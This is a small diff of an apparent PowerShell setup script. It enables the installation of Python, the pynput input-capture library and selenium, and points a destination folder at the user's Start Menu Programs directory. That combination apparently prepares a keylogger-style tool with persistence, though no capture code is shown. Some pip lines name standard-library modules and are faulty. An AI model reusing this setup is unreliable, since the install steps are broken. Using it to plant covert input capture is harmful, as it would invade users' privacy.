@@ -15,15 +15,15 @@
 # }
 # scoop update
 
-# if ( -not (Get-command python -errorAction SilentlyContinue)){
-#   scoop install python
-#   pip install pynput
-#   pip install os
-#   pip install datetime
-#   pip install time
-#   pip install selenium
+if ( -not (Get-command python -errorAction SilentlyContinue)){
+  scoop install python
+  pip install pynput
+  pip install os
+  pip install datetime
+  pip install time
+  pip install selenium
 
-# }
+}
 
 $destinationFolder = "~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
 
